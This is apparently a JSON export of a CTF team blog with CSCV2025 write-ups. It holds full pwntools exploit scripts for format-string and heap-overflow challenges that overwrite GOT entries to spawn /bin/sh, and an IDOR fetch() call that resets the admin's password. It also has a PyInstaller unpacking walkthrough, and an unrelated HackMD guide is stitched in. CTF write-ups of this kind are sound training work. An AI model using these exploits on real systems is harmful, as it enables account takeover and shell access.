
[{"content":"","date":"23 October 2025","externalUrl":null,"permalink":"/tags/example/","section":"Tags","summary":"","title":"Example","type":"tags"},{"content":"an example to get you started\nThis is a heading\r#\rThis is a subheading\r#\rThis is a subsubheading\r#\rThis is a subsubsubheading\r#\rThis is a paragraph with bold and italic text. Check more at Blowfish documentation undefined\n","date":"23 October 2025","externalUrl":null,"permalink":"/for/1761228735377-for/","section":"Fors","summary":"","title":"FOR","type":"for"},{"content":"","date":"23 October 2025","externalUrl":null,"permalink":"/for/","section":"Fors","summary":"","title":"Fors","type":"for"},{"content":"","date":"23 October 2025","externalUrl":null,"permalink":"/","section":"MSEC","summary":"","title":"MSEC","type":"page"},{"content":"","date":"23 October 2025","externalUrl":null,"permalink":"/tags/tag/","section":"Tags","summary":"","title":"Tag","type":"tags"},{"content":"","date":"23 October 2025","externalUrl":null,"permalink":"/tags/","section":"Tags","summary":"","title":"Tags","type":"tags"},{"content":"","externalUrl":null,"permalink":"/authors/","section":"Authors","summary":"","title":"Authors","type":"authors"},{"content":"","externalUrl":null,"permalink":"/categories/","section":"Categories","summary":"","title":"Categories","type":"categories"},{"content":"\rCSCV2025 - Pwn\r#\rRacehorseS\r#\rSummary\r#\rSources: horse_say.zip\nThe binary contains a format-string vulnerability in printf(s) and Partial RELRO. Use a format-string to overwrite GOT entries. The goal is to get a shell by redirecting strlen() to system() and passing \u0026quot;/bin/sh\u0026quot;.\nExploit\r#\rAllow multiple inputs\r#\rint __fastcall main(int argc, const char **argv, const char **envp) { unsigned __int64 i; // [rsp+10h] [rbp-430h] unsigned __int64 j; // [rsp+18h] [rbp-428h] size_t v6; // [rsp+20h] [rbp-420h] size_t v7; // [rsp+28h] [rbp-418h] char s[1032]; // [rsp+30h] [rbp-410h] BYREF unsigned __int64 v9; // [rsp+438h] [rbp-8h] v9 = __readfsqword(0x28u); setup(argc, argv, envp); memset(s, 0, 0x400u); printf(\u0026#34;Say something: \u0026#34;); if ( fgets(s, 1024, stdin) ) { v6 = strlen(s); if ( v6 \u0026amp;\u0026amp; s[v6 - 1] == 10 ) s[v6 - 1] = 0; v7 = strlen(s); if ( !v7 ) strcpy(s, \u0026#34;(silence)\u0026#34;); putchar(32); for ( i = 0; i \u0026lt; v7 + 2; ++i ) putchar(95); printf(\u0026#34;\\n\u0026lt; \u0026#34;); printf(s); puts(\u0026#34; \u0026gt;\u0026#34;); for ( j = 0; j \u0026lt; v7 + 2; ++j ) putchar(45); putchar(10); puts(\u0026#34; \\\\ ^__^\u0026#34;); puts(\u0026#34; \\\\ (oo)\\\\_______\u0026#34;); puts(\u0026#34; (__)\\\\ )\\\\/\\\\\u0026#34;); puts(\u0026#34; ||-----||\u0026#34;); puts(\u0026#34; || ||\u0026#34;); puts(\u0026amp;byte_402096); exit(0); } return 0; } The program normally exits after one input. Overwrite exit's GOT entry to point to main so the program loops and accepts input repeatedly.\npl = b\u0026#39;%4829c%14$hn\u0026#39; pl = pl.ljust(16, b\u0026#39;A\u0026#39;) pl += p64(0x404048) sla(\u0026#34;something: \u0026#34;, pl) This writes the low 2 bytes to the target GOT address using %hn. After this the program returns to main instead of exiting.\nLeak libc\r#\rLeak an address from the stack to compute libc base. In this run the leak is libc_start_call_main+122 at stack offset 281.\npl2 = b\u0026#39;%281$p\u0026#39; sla(\u0026#34;something: \u0026#34;, pl2) Parse the leaked pointer and subtract the known offset to get libc.base. Then compute system.\nOverwrite strlen GOT with system\r#\rmain() calls fgets() then strlen(). Overwrite the GOT entry for strlen with the address of system. When strlen(s) is called with s = \u0026ldquo;/bin/sh\u0026rdquo;, system(\u0026quot;/bin/sh\u0026quot;) runs.\nif ( fgets(s, 1024, stdin) ) { v6 = strlen(s); pl3 = fmtstr_payload(12, {exe.got.strlen : system}) sla(\u0026#34;something: \u0026#34;, pl3) Before: After: Trigger shell\r#\rSend /bin/sh as the input. The overwritten GOT causes execution of system(\u0026quot;/bin/sh\u0026quot;). Then interact with the shell and read the flag.\n#!/usr/bin/env python3 from pwn import * import subprocess exe = ELF(\u0026#39;horse_say\u0026#39;, checksec=False) libc = ELF(\u0026#39;libc.so.6\u0026#39;, checksec=False) context.binary = exe info = lambda msg: log.info(msg) s = lambda data, proc=None: proc.send(data) if proc else p.send(data) sa = lambda msg, data, proc=None: proc.sendafter(msg, data) if proc else p.sendafter(msg, data) sl = lambda data, proc=None: proc.sendline(data) if proc else p.sendline(data) sla = lambda msg, data, proc=None: proc.sendlineafter(msg, data) if proc else p.sendlineafter(msg, data) sn = lambda num, proc=None: proc.send(str(num).encode()) if proc else p.send(str(num).encode()) sna = lambda msg, num, proc=None: proc.sendafter(msg, str(num).encode()) if proc else p.sendafter(msg, str(num).encode()) sln = lambda num, proc=None: proc.sendline(str(num).encode()) if proc else p.sendline(str(num).encode()) slna = lambda msg, num, proc=None: proc.sendlineafter(msg, str(num).encode()) if proc else p.sendlineafter(msg, str(num).encode()) r = lambda n=4096, proc=None: proc.recv(n) if proc else p.recv(n) rl = lambda proc=None: proc.recvline() if proc else p.recvline() ru = lambda delim=b\u0026#39;\\n\u0026#39;, proc=None: proc.recvuntil(delim) if proc else p.recvuntil(delim) ra = lambda proc=None: proc.recvall() if proc else p.recvall() def GDB(): gdb.attach(p, gdbscript=\u0026#34;\u0026#34;\u0026#34; b*main+118 b*main+385 b*main+551 \u0026#34;\u0026#34;\u0026#34;) if args.REMOTE: p = remote(\u0026#34;pwn1.cscv.vn\u0026#34;, int(\u0026#34;6789\u0026#34;)) else: p = process([exe.path]) if args.GDB: GDB() # Gud luk pwner ! ru(\u0026#34;work: \u0026#34;) curl_cmd = rl().strip() info(f\u0026#39;curl: {curl_cmd}\u0026#39;) try: sol = subprocess.check_output(curl_cmd.decode(), shell=True, executable=\u0026#34;/bin/sh\u0026#34;, stderr=subprocess.DEVNULL).strip() log.info(f\u0026#34;pow solution: {sol!r}\u0026#34;) sla(b\u0026#34;solution: \u0026#34;, sol) except subprocess.CalledProcessError: log.warning(\u0026#34;Cháº¡y curl|sh tháº¥t báº¡i. Báº¡n cÃ³ thá»ƒ cháº¡y thá»§ cÃ´ng trÃªn mÃ¡y local:\u0026#34;) log.warning(curl_cmd.decode()) pl = b\u0026#39;%4829c%14$hn\u0026#39; pl = pl.ljust(16, b\u0026#39;A\u0026#39;) pl += p64(0x404048) sla(\u0026#34;something: \u0026#34;, pl) pl2 = b\u0026#39;%281$p\u0026#39; sla(\u0026#34;something: \u0026#34;, pl2) ru(\u0026#39;0x\u0026#39;) leak = r(12) leak_addr = int(b\u0026#39;0x\u0026#39; + leak, 16) info(f\u0026#39;leak addr: {hex(leak_addr)}\u0026#39;) libc.address = leak_addr - 0x2a1ca info(f\u0026#39;libc base: {hex(libc.address)}\u0026#39;) system = libc.symbols[\u0026#39;system\u0026#39;] info(f\u0026#39;system: {hex(system)}\u0026#39;) pl3 = fmtstr_payload(12, {exe.got.strlen : system}) sla(\u0026#34;something: \u0026#34;, pl3) sla(\u0026#34;something: \u0026#34;, b\u0026#39;/bin/sh\\x00\u0026#39;) sl(\u0026#39;cat flag\u0026#39;) p.interactive() Result\r#\rFlag CSCV2025{k1m1_n0_4184_64_2ukyun_d0kyun_h45h1r1d35h1}\nHeap NoteS\r#\rSummary\r#\rSources: heapnote.zip\nVulnerabilities:\nHeap overflow in write_note() via gets() allows overwriting adjacent chunks.\nread_note() does not validate indices, allowing memory leaks.\nGoal: leak libc, overwrite GOT to call system(\u0026quot;/bin/sh\u0026quot;), and retrieve the flag.\nExploit\r#\rint __fastcall __noreturn main(int argc, const char **argv, const char **envp) { int v3; // [rsp+4h] [rbp-Ch] BYREF unsigned __int64 v4; // [rsp+8h] [rbp-8h] v4 = __readfsqword(0x28u); setbuf(stdin, 0); setbuf(_bss_start, 0); setbuf(stderr, 0); while ( 1 ) { menu(); __isoc99_scanf(\u0026#34;%d%*c\u0026#34;, \u0026amp;v3); if ( v3 == 4 ) exit(0); if ( v3 \u0026gt; 4 ) { LABEL_12: puts(\u0026#34;Wrong choice\u0026#34;); } else { switch ( v3 ) { case 3: write_note(); break; case 1: create_note(); break; case 2: read_note(); break; default: goto LABEL_12; } } } } int create_note() { __int64 i; // [rsp+0h] [rbp-10h] _QWORD *v2; // [rsp+8h] [rbp-8h] if ( g_note ) { for ( i = g_note; *(_QWORD *)(i + 8); i = *(_QWORD *)(i + 8) ) ; v2 = malloc(0x30u); *(_DWORD *)v2 = *(_DWORD *)i + 1; v2[1] = 0; *(_QWORD *)(i + 8) = v2; return printf(\u0026#34;Note with index %u created\\n\u0026#34;, *(_DWORD *)v2); } else { g_note = (__int64)malloc(0x30u); *(_DWORD *)g_note = 0; *(_QWORD *)(g_note + 8) = 0; return puts(\u0026#34;Note with index 0 created\u0026#34;); } } unsigned __int64 read_note() { int v1; // [rsp+Ch] [rbp-14h] BYREF __int64 i; // [rsp+10h] [rbp-10h] unsigned __int64 v3; // [rsp+18h] [rbp-8h] v3 = __readfsqword(0x28u); if ( g_note ) { v1 = 0; printf(\u0026#34;Index: \u0026#34;); __isoc99_scanf(\u0026#34;%u%*c\u0026#34;, \u0026amp;v1); for ( i = g_note; *(_DWORD *)i != v1; i = *(_QWORD *)(i + 8) ) { if ( !*(_QWORD *)(i + 8) ) return v3 - __readfsqword(0x28u); } puts((const char *)(i + 16)); } return v3 - __readfsqword(0x28u); } unsigned __int64 write_note() { int v1; // [rsp+Ch] [rbp-14h] BYREF __int64 i; // [rsp+10h] [rbp-10h] unsigned __int64 v3; // [rsp+18h] [rbp-8h] v3 = __readfsqword(0x28u); if ( g_note ) { v1 = 0; printf(\u0026#34;Index: \u0026#34;); __isoc99_scanf(\u0026#34;%u%*c\u0026#34;, \u0026amp;v1); for ( i = g_note; *(_DWORD *)i != v1; i = *(_QWORD *)(i + 8) ) { if ( !*(_QWORD *)(i + 8) ) return v3 - __readfsqword(0x28u); } gets(i + 16); } return v3 - __readfsqword(0x28u); } Leak libc by overwriting next pointer\r#\rUse the heap overflow to overwrite the next pointer of the next chunk. Set next = 0x404009. Calling read_note(0x4010) will read from 0x404009 + 16 = 0x404019, leaking a libc pointer (printf). From the leak, calculate libc base and system.\npayload = b\u0026#39;\\x00\u0026#39; * 40 payload += p64(0x41) payload += p64(1) payload += p64(0x404008+1) write(0, payload) read(0x4010) Fake next pointer to GOT and overwrite with system\r#\rNext, fake the next pointer to 0x404010. Then gets(i+16) writes into 0x404020, which is the GOT entry for gets. Create a chunk containing /bin/sh:\npayload = b\u0026#39;/bin/sh\\x00\u0026#39; + p64(0)*4 + p64(0x41) + p64(1) + p64(0x404010) write(0, payload) Overwrite the GOT entry with system:\nwrite(libc.sym[\u0026#39;setbuf\u0026#39;] \u0026amp; 0xffffffff, system) Before: After: After this, calling gets() triggers system(\u0026quot;/bin/sh\u0026quot;).\nTrigger shell and read flag\r#\rCall write_note function to execute system(\u0026quot;/bin/sh\u0026quot;). Then read the flag.\n#!/usr/bin/env python3 from pwn import * exe = ELF(\u0026#39;challenge_patched\u0026#39;, checksec=False) libc = ELF(\u0026#39;libc.so.6\u0026#39;, checksec=False) context.binary = exe info = lambda msg: log.info(msg) s = lambda data, proc=None: proc.send(data) if proc else p.send(data) sa = lambda msg, data, proc=None: proc.sendafter(msg, data) if proc else p.sendafter(msg, data) sl = lambda data, proc=None: proc.sendline(data) if proc else p.sendline(data) sla = lambda msg, data, proc=None: proc.sendlineafter(msg, data) if proc else p.sendlineafter(msg, data) sn = lambda num, proc=None: proc.send(str(num).encode()) if proc else p.send(str(num).encode()) sna = lambda msg, num, proc=None: proc.sendafter(msg, str(num).encode()) if proc else p.sendafter(msg, str(num).encode()) sln = lambda num, proc=None: proc.sendline(str(num).encode()) if proc else p.sendline(str(num).encode()) slna = lambda msg, num, proc=None: proc.sendlineafter(msg, str(num).encode()) if proc else p.sendlineafter(msg, str(num).encode()) r = lambda n=4096, proc=None: proc.recv(n) if proc else p.recv(n) rl = lambda proc=None: proc.recvline() if proc else p.recvline() ru = lambda delim=b\u0026#39;\\n\u0026#39;, proc=None: proc.recvuntil(delim) if proc else p.recvuntil(delim) ra = lambda proc=None: proc.recvall() if proc else p.recvall() def GDB(): gdb.attach(p, gdbscript=\u0026#34;\u0026#34;\u0026#34; b*main+119 \u0026#34;\u0026#34;\u0026#34;) if args.REMOTE: p = remote(\u0026#34;pwn2.cscv.vn\u0026#34;, \u0026#34;3333\u0026#34;) else: p = process([exe.path]) if args.GDB: GDB() # Gud luk pwner ! def create(): sla(b\u0026#39;\u0026gt; \u0026#39;, b\u0026#39;1\u0026#39;) def read(idx): sla(b\u0026#39;\u0026gt; \u0026#39;, b\u0026#39;2\u0026#39;) slna(b\u0026#39;Index: \u0026#39;, idx) def write(idx, content): sla(b\u0026#39;\u0026gt; \u0026#39;, b\u0026#39;3\u0026#39;) slna(b\u0026#39;Index: \u0026#39;, idx) sl(content) create() create() payload = b\u0026#39;\\x00\u0026#39; * 40 payload += p64(0x41) payload += p64(1) payload += p64(0x404008+1) write(0, payload) read(0x4010) leak = rl() printf_leak = (u64(leak.ljust(8,b\u0026#39;\\x00\u0026#39;)) \u0026amp; 0xffffffffff ) \u0026lt;\u0026lt; 8 info(f\u0026#39;printf_leak: {hex(printf_leak)}\u0026#39;) libc.address = printf_leak - libc.sym[\u0026#39;printf\u0026#39;] info(f\u0026#39;libc.address: {hex(libc.address)}\u0026#39;) system = p64(libc.sym[\u0026#39;system\u0026#39;]) info(f\u0026#39;system: {hex(libc.sym[\u0026#34;system\u0026#34;])}\u0026#39;) payload = b\u0026#39;/bin/sh\\x00\u0026#39; + p64(0)*4 + p64(0x41) + p64(1) + p64(0x404010) write(0, payload) write(libc.sym[\u0026#39;setbuf\u0026#39;] \u0026amp; 0xffffffff, system) sla(b\u0026#39;\u0026gt; \u0026#39;, b\u0026#39;3\u0026#39;) slna(b\u0026#39;Index: \u0026#39;, b\u0026#39;0\u0026#39;) sl(\u0026#39;cat flag.txt\u0026#39;) p.interactive() Result\r#\rFlag CSCV2025{313487590c9dbf64bdd49d7e76980965}\nSudokuS\r#\rSummary\r#\rSources: public.zip\nExploit\r#\rint __fastcall main(int argc, const char **argv, const char **envp) { int choice; // [rsp+8h] [rbp-8h] BYREF int v5; // [rsp+Ch] [rbp-4h] init(argc, argv, envp); init_sec_comp(); puts(\u0026#34;=== CSCV2025 - SudoShell ===\u0026#34;); menu(); printf(\u0026#34;\u0026gt; \u0026#34;); v5 = __isoc99_scanf(\u0026#34;%d\u0026#34;, \u0026amp;choice); if ( v5 \u0026lt;= 0 ) { perror(\u0026#34;scanf failed\u0026#34;); exit(1); } switch ( choice ) { case 1: start_game(); break; case 2: exit(0); case 3: help(); break; } return 0; } Ta tháº¥y cÃ³ RWX Segments, kháº£ nÄƒng lÃ  ret2shellcode. NgoÃ i ra chÆ°Æ¡ng trÃ¬nh cÃ²n cÃ³ lá»›p báº£o vá»‡ seccomp:\n","externalUrl":null,"permalink":"/pwn/1761226116132-abc/","section":"Pwns","summary":"","title":"CSCV2025 - Pwn","type":"pwn"},{"content":"\rLEAK FORCE\r#\rTEST\r#\rChallenge cung cáº¥p má»™t mÃ£ nguá»“n HTML http://web1.cscv.vn:9981/ TrÆ°á»›c tiÃªn em sáº½ thá»­ cÃ¡c chá»©c nÄƒng cá»§a web\nRegister cÃ¡c thá»© cÃ¡c thá»© rá»“i login vá»›i username: abc2, password: abc\nSau khi login xong thÃ¬ sáº½ Ä‘Æ°á»£c chuyá»ƒn tá»›i trang http://web1.cscv.vn:9981/profile.html Táº¡i Ä‘Ã¢y em thá»­ cÃ¡c chá»©c nÄƒng Save Changes vÃ  Update Password thÃ¬ khÃ´ng cÃ³ gÃ¬ Ä‘áº·c biá»‡t\nVá»›i target lÃ  IDOR, thÃ¬ thÆ°á»ng admin user cÃ³ thá»ƒ lÃ  ID 1 (khÃ¡ phá»• biáº¿n)\nEm Ä‘Ã£ thá»­ lá»‡nh curl \u0026lsquo;http://web1.cscv.vn:9981/api/profile?id=1' \\ vÃ  káº¿t quáº£ tráº£ vá» lÃ \n-H \u0026#39;Accept: */*\u0026#39; \\ -H \u0026#39;Accept-Language: en-US,en;q=0.9,vi-VN;q=0.8,vi;q=0.7\u0026#39; \\ -H \u0026#39;Connection: keep-alive\u0026#39; \\ -H \u0026#39;If-None-Match: W/\u0026#34;e8-LeJvTb4wZSK6PbyPTrZ1iVWdsIM\u0026#34;\u0026#39; \\ -H \u0026#39;Referer: http://web1.cscv.vn:9981/profile.html\u0026#39; \\ -H \u0026#39;User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36\u0026#39; \\ --insecure {\u0026#34;id\u0026#34;:1,\u0026#34;fullName\u0026#34;:\u0026#34;CTF Admin\u0026#34;,\u0026#34;username\u0026#34;:\u0026#34;admin\u0026#34;,\u0026#34;email\u0026#34;:\u0026#34;test1234@example.com\u0026#34;,\u0026#34;description\u0026#34;:\u0026#34;New user1\u0026#34;,\u0026#34;avatar\u0026#34;:\u0026#34;/uploads/user_undefined_1760753297965.txt\u0026#34;,\u0026#34;birthdate\u0026#34;:null,\u0026#34;gender\u0026#34;:null,\u0026#34;company\u0026#34;:\u0026#34;abc\u0026#34;} Tá»« Ä‘Ã¢y em Ä‘Ã£ cháº¯c cháº¯n ID admin lÃ  1 Vá»¤T\r#\rKhai thÃ¡c IDOR: dÃ¹ng chá»©c nÄƒng Ä‘áº·t láº¡i máº­t kháº©u Ä‘á»ƒ láº¥y quyá»ƒn truy cáº­p vÃ o tÃ i khoáº£n admin\nEm vÃ o Devtools -\u0026gt; Network Ä‘á»ƒ kiá»ƒm tra cÃ³ nhá»¯ng gÃ¬\nEm thá»­ check response cá»§a profile.js Tá»« Ä‘Ã¢y em sáº½ táº­n dá»¥ng endpoint tá»« Network Ä‘á»ƒ reset password cá»§a ID=1 (ID cá»§a admin user) vÃ  láº¥y quyá»ƒn truy cáº­p tá»›i tÃ i khoáº£n Admin\nSá»­ dá»¥ng console Ä‘á»ƒ gá»­i fetch thay Ä‘á»•i máº­t kháº©u tá»›i ID=1\n(async function() { const targetId = 1; const newPassword = \u0026#39;msec\u0026#39;; const response = await fetch(\u0026#39;/api/reset-password\u0026#39;, { method: \u0026#39;POST\u0026#39;, headers: { \u0026#39;Content-Type\u0026#39;: \u0026#39;application/json\u0026#39; }, body: JSON.stringify({ id: targetId, newPassword: newPassword }) }); const result = await response.json(); if (response.ok) { console.log(\u0026#39;Äáº·t láº¡i máº­t kháº©u thÃ nh cÃ´ng cho ID:\u0026#39;, targetId, result); } else { console.error(\u0026#39;Tháº¥t báº¡i:\u0026#39;, result); } })(); Response: Sau Ä‘Ã³ logout rá»“i login vá»›i username=admin, password=msec vÃ  nháº­n Ä‘Æ°á»£c flag ** FLAG: CSCV2025{7h3_Uni73d_N47i0ns_C0nv3n7i0n_4g4ins7_Cyb3rcrim3}**\n","externalUrl":null,"permalink":"/web/1761228033953-xyz/","section":"Webs","summary":"","title":"LEAK FORCE","type":"web"},{"content":"","externalUrl":null,"permalink":"/pwn/","section":"Pwns","summary":"","title":"Pwns","type":"pwn"},{"content":"","externalUrl":null,"permalink":"/re/","section":"Res","summary":"","title":"Res","type":"re"},{"content":"","externalUrl":null,"permalink":"/series/","section":"Series","summary":"","title":"Series","type":"series"},{"content":"","externalUrl":null,"permalink":"/web/","section":"Webs","summary":"","title":"Webs","type":"web"},{"content":" title: Welcome to HackMD! tags: [onboarding]\nWelcome to HackMD!\r#\rWelcome to HackMD! ğŸ‘‹ Your trusted tool to take notes, share findings, create road-maps, collaborate virtually, and anything else you need \u0026ndash; all in Markdown. With our Markdown editor, you and your team can edit, share, and discuss your documents in real-time.\nThroughout this tutorial, we\u0026rsquo;ll walk through everything you need to know about the Markdown editor and how you can use HackMD to its fullest.\nLet\u0026rsquo;s get started!\nWhat we\u0026rsquo;ll cover\r#\rWorkspace \u0026amp; sidebar Personal workspace Create a note Start with a template Insert images \u0026amp; gifs Comments Suggest edit Share \u0026amp; set permissions Publishing Further learning Workspace \u0026amp; sidebar\r#\rWhenever you sign into your HackMD account, you\u0026rsquo;ll be greeted by a workspace. Everything you do in HackMD takes place in a workspace. Think of this as your homebase, where you can create new notes, jump back into existing ones, change your settings \u0026ndash; anything you need to stay organized and create with ease.\nWhether just yourself or together as a team, every workspace consists of a sidebar and note list. The note list takes up the bulk of the page. Here is where you\u0026rsquo;ll find all your notes. On the sidebar, you\u0026rsquo;ll find\u0026hellip;\nSidebar\r#\r![image](https://hackmd.io/_uploads/S126WKlo0.png =300x)\nToggle to switch between personal and team workspaces. Keyword search bar. \u0026ldquo;New note\u0026rdquo; button. Trash (notes permanently delete after 3 days in the trash). List of tags (these help you filter your notes). List of all bookmarked notes. List of recently viewed notes. [!Tip] Personal vs team sidebar Your team workspace sidebar may look a little different, depending on your permissions within that specific workspace.\nPersonal workspace\r#\rYour personal workspace is your domain. A place where you can record daily activities, write study notes, brainstorm \u0026ndash; anything you\u0026rsquo;d like! This is your space. Only you have access.\nYour personal workspace is also where you can manage your account.\nAccount management\r#\rEvery personal workspace has\u0026hellip;\n![image](https://hackmd.io/_uploads/SycrjDw-yx.png =300x)\nAccount settings. Personal profile page (this is your public page). A list of all the teams you\u0026rsquo;ve joined. Billing settings. A space to\u0026hellip; Change your language preference. Contact the HackMD team. View the Terms of Use. Create a note\r#\rCreating your first note takes only a few seconds.\nClick the \u0026ldquo;New note\u0026rdquo; button at the top of the sidebar to create a note. Once your note opens, you can give it a title, create a document tag, and begin jotting down ideas. ![image](https://hackmd.io/_uploads/Hkz8jJbK0.png =300x)\n[!Tip] Document tags help you organize your work. Organize your documents into groups, keeping your workspace organized and docs easy to find.\nEager to start customizing your note? Like other editing platforms, you can click the toolbar buttons to apply text effects. Bold, italics, bullet points, and tables can all be used with a single click.\n![image](https://hackmd.io/_uploads/SJF1uvPZye.png =550x)\nAnd if you\u0026rsquo;re searching for a specific Markdown function, click on the ? to view a Markdown syntax cheat sheet. ![image](https://hackmd.io/_uploads/r1zruPD-Jx.png =300x)\nWe value your feedback!\r#\rDid you find this guide helpful? Answer one question in this survey and let us know.\nStart with a template\r#\rTo help you get started with HackMD, we\u0026rsquo;ve created a host of templates you can use as a jumping-off point for your notes.\nTo get started, click and then \u0026ldquo;New note from template.\u0026rdquo; From there, you can view our full list of templates. These cover a number of different purposes, which you can use as a starting point or for inspiration. Once you decide on the template, click \u0026ldquo;Use this template\u0026rdquo; to open it as a note. ![image](https://hackmd.io/_uploads/rJ8mYiWaC.png =300x) Here are a few of our favorite templates:\nğŸ“‘ Project README ğŸ› ï¸ Product Brief ğŸ–‹ï¸ Meeting Minutes ğŸ¨ Design specs Insert images \u0026amp; gifs\r#\rYou can enrich your notes by inserting project images, offline event photos, or demonstration GIFs.\nThere are two main ways to upload images:\nChoose the image you want to insert by clicking ğŸ–¼ï¸ in the toolbar. Drag and drop the file into the note editor. ![image](https://hackmd.io/_uploads/HJxGFDvZJg.png =400x) We support the following formats for images and gifs: PNG, JPG, GIF, BMP, and TIF.\nYou can add attributes after the image link to specify the image size (i.e. =300x or =50%).\nImage: GIFs: Comments\r#\rCommenting is the easiest way to give or receive feedback directly in your notes.\nThere are two main ways to leave a comment:\nSelect a piece of text in any note. Click the comment panel. ![image](https://hackmd.io/_uploads/SJRxyCQFR.png =300x) Along with leaving comments about the overall note, the comment panel allows you to view and interact with all the note comments. You can even tag another teammate in a comment by @-mentioning them.\nWant to delete or resolve a comment? Click the three dots on the upper right-hand side to expand the menu. From there, click your desired action.\n![image](https://hackmd.io/_uploads/HJGKTztvR.png =300x)\nYou can always re-open resolved comments by clicking on the comment panel ğŸ’¬ at the top of the page and then the \u0026ldquo;Marked as Resolved\u0026rdquo; button. From there, click the three dots next to the comment you\u0026rsquo;d like to re-open and \u0026ldquo;Revert resolved\u0026rdquo;.\nWe value your feedback!\r#\rDid you find this guide helpful? Answer one question in this survey and let us know.\nSuggest edit\r#\rSuggest Edit allows you to suggest edits to content you\u0026rsquo;re working with others on \u0026ndash; correct typos, suggest better wording, or even create a to-do list.\nFirst, you\u0026rsquo;ll want to make sure this feature is turned on within your note. To do that, simply\u0026hellip;\nOpen the \u0026ldquo;Share\u0026rdquo; menu in the upper right-hand corner. ![image](https://hackmd.io/_uploads/B1uSCa7tC.png =300x) Click \u0026ldquo;More features\u0026rdquo; to confirm the comment setting and suggest edits are ==\u0026ldquo;on.\u0026quot;== ![image](https://hackmd.io/_uploads/BJdwRpXYR.png =300x) This is also the area to confirm who is allowed to comment and make edits to your note. From there suggesting edits is fairly straightforward. Like creating a comment, to suggest an edit select a piece of text within your note and then click \u0026ldquo;Suggest edit\u0026rdquo;.\nWhere to find the suggestions?\r#\rAll the suggested edits will live in the edit panel. To find that, click the ğŸ’¬ at the top right of the note. From there, click \u0026ldquo;Comments\u0026rdquo; to activate the drop-down bar.\nThis will show you all the current suggestions, as well as any previously addressed suggestions.\n![image](https://hackmd.io/_uploads/SkhEZdwbkx.png =300x)\nShare \u0026amp; set permissions\r#\rHackMD is built for real-time collaboration, so there are many ways to share your work with others.\nPermissioning with the notes ensures that your collaborators access your content exactly the way you want them to.\nShare button\r#\rClick the \u0026ldquo;Share\u0026rdquo; button at the top right-hand corner of your note. Here you can:\nInvite someone to your note. See and change who has access to the note, and what level of permissions they have. Edit the note\u0026rsquo;s permalink. Copy the note\u0026rsquo;s link to share it with others. Publish your note. (We\u0026rsquo;ll discuss this one later.) ![image](https://hackmd.io/_uploads/Sy42iZm30.png =150x) Link / Permalink\r#\rAt the top of the Share menu is the note\u0026rsquo;s URL or link.\nHere\u0026rsquo;s where you can edit that link, as well as copy it for easy sharing.\nNote Permission\r#\rOnce that\u0026rsquo;s set, underneath you\u0026rsquo;ll find the \u0026ldquo;Note Permission\u0026rdquo; section. That can be set for those who will be reading your note and those writing in it.\n![image](https://hackmd.io/_uploads/r1ptpZXh0.png =300x)\n[!Caution] Once the reading permission is set to \u0026ldquo;Everyone,\u0026rdquo; there are no restrictions on individuals or team members. No matter who gets the link, anyone can read it.\nInvitee\r#\rAt the bottom of the \u0026ldquo;Share\u0026rdquo; menu, you\u0026rsquo;ll find the Invitee section. This is where you can invite individual HackMD users to your note \u0026ndash; invitees need a HackMD account to be invited to your note.\n![image](https://hackmd.io/_uploads/S1PKi-m2C.png =300x)\nPublishing\r#\rPublishing your HackMD notes takes just a second.\nOpen the \u0026ldquo;Share\u0026rdquo; menu Switch to the \u0026ldquo;Publish\u0026rdquo; tab. Ensure compliance with and agree to the HackMD Community Guidelines And publish! ![image](https://hackmd.io/_uploads/SJCG7iZpR.png =300x) Further learning\r#\rWant to learn more ways you can use HackMD? Check out the Expert and Markdown guides in your workspace.\nThe Expert Guide covers:\nTeam Workspaces Sync with GitHub API Calls Book Mode Custom Templates Embed Notes LaTeX \u0026amp; MathJax UML diagrams The Markdown Guide covers:\nMarkdown syntax Text styles Tables Table of contents Edit vs View pages Before you go, HackMD has an official user manual with instructions for all its features!\nIn our tutorial book, you\u0026rsquo;ll find detailed guides to all the main features of HackMD that boost your productivity.\n\u0026#x1f449; HackMD Tutorial Book \u0026#x1f448;\r#\rDon\u0026rsquo;t want to miss the latest news and feature updates from HackMD? Be sure to follow our social channels or join us on Discord.\n\u0026#x1f4eb; support@hackmd.io X (Twitter) Facebook LinkedIn Discord We value your feedback!\r#\rDid you find this guide helpful? Answer one question in this survey and let us know.\n","externalUrl":null,"permalink":"/web/1761227510853-abc/","section":"Webs","summary":"","title":"Welcome to HackMD!","type":"web"},{"content":"Hello everyoneğŸ’¯! Today i will tell you the way to solve the Chatbot challenge in CSCV2025\nThe question: So at first you will have an file main like this below: Let open this file in DIE to see the information about this file: This is an ELF64 file and DIE has told us that this file have been packed with PyInstaller Let use IDA(in app use SHIFT+F12) to see strings of this file: Scroll down a little bit and you will see this: We see many file like Py_ so that means this file was built by python We will use pyinstxtrator.py to export the content of this file(point in the main file to open terminal) Type:\npython pyinstxtractor.py main Output will be:\nGo back to the folder you put the main file and you will see there are an additional folder name main_extracted: Now we will use a python decompiler to make main.pyc file to main.py file I will use pylingual, link in here:https://www.pylingual.io/ The file after decompile to .py such like this:\n# Decompiled with PyLingual (https://pylingual.io) # Internal filename: main.py # Bytecode version: 3.11a7e (3495) # Source timestamp: 1970-01-01 00:00:00 UTC (0) import base64 import json import time import random import sys import os from ctypes import CDLL, c_char_p, c_int, c_void_p from cryptography.hazmat.primitives import serialization, hashes from cryptography.hazmat.primitives.asymmetric import padding import ctypes def get_resource_path(name): if getattr(sys, \u0026#39;frozen\u0026#39;, False): base = sys._MEIPASS else: # inserted base = os.path.dirname(__file__) return os.path.join(base, name) def load_native_lib(name): return CDLL(get_resource_path(name)) if sys.platform == \u0026#39;win32\u0026#39;: LIBNAME = \u0026#39;libnative.dll\u0026#39; else: # inserted LIBNAME = \u0026#39;libnative.so\u0026#39; lib = None check_integrity = None decrypt_flag_file = None free_mem = None try: lib = load_native_lib(LIBNAME) check_integrity = lib.check_integrity check_integrity.argtypes = [c_char_p] check_integrity.restype = c_int decrypt_flag_file = lib.decrypt_flag_file decrypt_flag_file.argtypes = [c_char_p] decrypt_flag_file.restype = c_void_p free_mem = lib.free_mem free_mem.argtypes = [c_void_p] free_mem.restype = None except Exception as e: print(\u0026#39;Warning: native lib not loaded:\u0026#39;, e) lib = None check_integrity = None decrypt_flag_file = None free_mem = None def run_integrity_or_exit(): if check_integrity: ok = check_integrity(sys.executable.encode()) if not ok: print(\u0026#39;[!] Integrity failed or debugger detected. Exiting.\u0026#39;) sys.exit(1) PUB_PEM = b\u0026#39;-----BEGIN PUBLIC 